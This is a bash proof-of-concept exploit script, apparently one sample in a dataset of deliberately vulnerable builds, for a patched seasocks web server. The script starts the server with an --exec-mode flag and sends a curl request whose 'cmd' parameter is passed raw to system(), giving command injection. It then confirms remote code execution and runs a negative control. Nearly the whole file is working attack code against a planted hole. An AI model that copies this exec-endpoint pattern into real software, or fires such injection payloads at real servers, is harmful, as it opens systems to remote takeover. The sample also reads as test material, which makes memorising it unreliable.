#!/usr/bin/env bash
# PoC for 111_seasocks_C1I3S3
# Axes: C1 (single CLI flag gate) / I3 (struct dispatch) / S3 (strpbrk check, disabled by default)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (seasocks_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/seasocks_server"
WWWROOT="/tmp/poc_111_www"
MARKER="/tmp/poc_111_marker"
PORT=18111

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting seasocks_server with --exec-mode on port $PORT..."
"$BINARY" --port "$PORT" --exec-mode &
SERVER_PID=$!
sleep 0.5

# ── trigger ────────────────────────────────────────────────────────────────────
# S3 bypass: --strict-exec was NOT passed, so strpbrk check is inactive.
# I3: struct dispatch calls system(args.cmd) with the raw string.
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without --exec-mode ──────────────────────
echo "[*] verifying gate: endpoint must be absent without --exec-mode..."
NEGPORT=19111
"$BINARY" --port $NEGPORT &
SAFE_PID=$!
sleep 0.5
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEGPORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null || true; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
